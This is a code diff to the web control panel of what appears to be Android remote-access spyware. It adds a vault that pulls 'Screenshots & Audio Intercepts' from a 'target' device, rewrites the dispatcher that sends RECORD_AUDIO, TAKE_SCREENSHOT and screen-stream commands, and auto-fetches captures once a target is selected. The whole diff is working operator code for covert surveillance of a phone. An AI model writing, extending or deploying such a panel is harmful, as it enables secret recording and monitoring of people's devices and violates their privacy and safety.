@@ -30,6 +30,7 @@
         .border-teal { border-left-color: #1abc9c; }
         .border-red { border-left-color: #e74c3c; }
         .border-purple { border-left-color: #9b59b6; }
+        .border-warning { border-left-color: #f39c12; }
         
         .card-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; z-index: 2; position: relative; }
         .card-icon { color: #fff; opacity: 0.9; }
@@ -139,7 +140,29 @@
             </div>
         </div>
 
-        <!-- 3. TACTICAL COMMAND -->
+        <!-- 3. NEW: LIVE OPS OUTPUT VAULT (VIEW RECENT CAPTURES) -->
+        <div class="flat-card border-warning">
+            <i data-lucide="archive" class="bg-icon"></i>
+            <div class="card-header">
+                <i data-lucide="download-cloud" class="card-icon"></i>
+                <div>
+                    <span class="card-title">Live Ops Output</span>
+                    <span class="card-subtitle">Recent Screenshots & Audio Intercepts</span>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <button class="btn btn-warning" onclick="fetchLiveOpsData()">
+                    <i data-lucide="refresh-cw" style="width:16px; height:16px;"></i> Fetch Latest Captures
+                </button>
+            </div>
+            
+            <div id="live-ops-content" style="margin-top: 15px; display: flex; flex-direction: column; gap: 10px;">
+                <div style="color: #888; font-size: 13px;">Click fetch to load secured media...</div>
+            </div>
+        </div>
+
+        <!-- 4. TACTICAL COMMAND -->
         <div class="flat-card border-red">
             <i data-lucide="shield-alert" class="bg-icon"></i>
             <div class="card-header">
@@ -157,7 +180,7 @@
             </div>
         </div>
 
-        <!-- 4. MEDIA VAULTS (FILE MANAGER & GALLERY) -->
+        <!-- 5. MEDIA VAULTS (FILE MANAGER & GALLERY) -->
         <div class="flat-card border-purple">
             <i data-lucide="hard-drive" class="bg-icon"></i>
             <div class="card-header">
@@ -193,19 +216,26 @@
                 document.getElementById('active-device-label').style.color = "#e74c3c";
             } else {
                 document.getElementById('active-device-label').innerText = `Target Context Authorized [ID: ${deviceId.substring(0,6)}...]`;
+                // Auto fetch recent captures on load
+                fetchLiveOpsData();
             }
         });
 
-        // 🚀 THE MASTER COMMAND DISPATCHER 
+        // 🚀 THE MASTER COMMAND DISPATCHER (FIXED)
         window.triggerCommand = async function(commandString, commandName) {
             if (!deviceId) return alert("Critical Error: No active device selected from Dashboard.");
             
             const isConfirmed = confirm(`AWAITING CONFIRMATION: Deploy ${commandName} protocol?`);
             if (!isConfirmed) return;
 
+            // Format commands exactly as Android expects them
             if (commandString === 'record_audio') {
                 const durationElement = document.getElementById('audio-duration');
-                if (durationElement) commandString = `record_audio:${durationElement.value}`;
+                commandString = `RECORD_AUDIO:${durationElement ? durationElement.value : '60'}`;
+            } else if (commandString === 'take_screenshot') {
+                commandString = 'TAKE_SCREENSHOT';
+            } else {
+                commandString = commandString.toUpperCase();
             }
 
             try {
@@ -218,7 +248,13 @@
                 const result = await res.json();
                 if (result.status === 'success') {
                     alert(`✅ Command [${commandName}] dispatched to target.`);
-                    window.location.href = '/ops'; // Redirect to Vault to see status
+                    
+                    // Naya Logic: Redirect hataya. Agar Media hai toh refresh dikhao.
+                    if (commandString.includes("SCREENSHOT") || commandString.includes("AUDIO")) {
+                        setTimeout(() => {
+                            document.getElementById('live-ops-content').innerHTML = '<div style="color: #f39c12; font-size: 13px;">Target is processing media. Click fetch again in 10 seconds...</div>';
+                        }, 2000);
+                    }
                 } else {
                     alert(`❌ Dispatch Failed: ${result.message}`);
                 }
@@ -227,7 +263,62 @@
             }
         };
 
-        // 🚀 LIVE SCREEN WEBSOCKET PIPELINE
+        // 🚀 FETCH LIVE OPS MEDIA (Screenshots & Audio)
+        window.fetchLiveOpsData = async function() {
+            const container = document.getElementById('live-ops-content');
+            container.innerHTML = '<div style="color: #888; font-size: 13px;"><i data-lucide="loader" class="fa-spin" style="width:14px;"></i> Fetching secured data...</div>';
+            lucide.createIcons();
+
+            try {
+                // Backend se LiveOps folders fetch kar rahe hain
+                const resScreens = await fetch(`/api/devices/${deviceId}/files?path=LiveOpsScreenshots`);
+                const resAudio = await fetch(`/api/devices/${deviceId}/files?path=LiveOpsAudio`);
+
+                const dataScreens = await resScreens.json();
+                const dataAudio = await resAudio.json();
+
+                let htmlContent = '';
+
+                // Screenshots Render
+                if (dataScreens.status === 'success' && dataScreens.data) {
+                    dataScreens.data.forEach(item => {
+                        if(item.file_url) {
+                            htmlContent += `
+                            <div style="background: #2a2a2a; padding: 10px; border-radius: 4px; display: flex; align-items: center; justify-content: space-between; border-left: 3px solid #3498db; margin-bottom: 5px;">
+                                <div style="font-size: 12px; word-break: break-all;">📸 ${item.file_name}</div>
+                                <a href="${item.file_url}" target="_blank" class="btn btn-primary" style="padding: 6px 12px; font-size: 11px; flex: 0 0 auto; margin-left:10px;">View</a>
+                            </div>`;
+                        }
+                    });
+                }
+
+                // Audio Render
+                if (dataAudio.status === 'success' && dataAudio.data) {
+                    dataAudio.data.forEach(item => {
+                        if(item.file_url) {
+                            htmlContent += `
+                            <div style="background: #2a2a2a; padding: 10px; border-radius: 4px; border-left: 3px solid #1abc9c; margin-bottom: 5px;">
+                                <div style="font-size: 12px; margin-bottom: 8px;">🎙️ ${item.file_name}</div>
+                                <audio controls style="width: 100%; height: 35px; border-radius: 4px;">
+                                    <source src="${item.file_url}" type="audio/mpeg">
+                                </audio>
+                            </div>`;
+                        }
+                    });
+                }
+
+                if (htmlContent === '') {
+                    container.innerHTML = '<div style="color: #888; font-size: 13px;">No recent live ops media found.</div>';
+                } else {
+                    container.innerHTML = htmlContent;
+                }
+
+            } catch (e) {
+                container.innerHTML = '<div style="color: #e74c3c; font-size: 13px;">Failed to load vault data.</div>';
+            }
+        };
+
+        // 🚀 LIVE SCREEN WEBSOCKET PIPELINE (Preserved from original)
         let liveSocketPipeline = null;
 
         window.toggleScreenStream = async function() {
@@ -244,7 +335,7 @@
                     await fetch(`/api/devices/${deviceId}/action`, {
                         method: 'POST',
                         headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ action: `start_screen_stream:${duration}` })
+                        body: JSON.stringify({ action: `START_SCREEN_STREAM:${duration}` })
                     });
                 } catch (err) { console.warn("Stream init silent fail."); }
 
@@ -279,7 +370,7 @@
                     await fetch(`/api/devices/${deviceId}/action`, {
                         method: 'POST',
                         headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ action: "stop_screen_stream" })
+                        body: JSON.stringify({ action: "STOP_SCREEN_STREAM" })
                     });
                 } catch(e) {}
                 window.resetStreamUI(btn, viewport, placeholder);
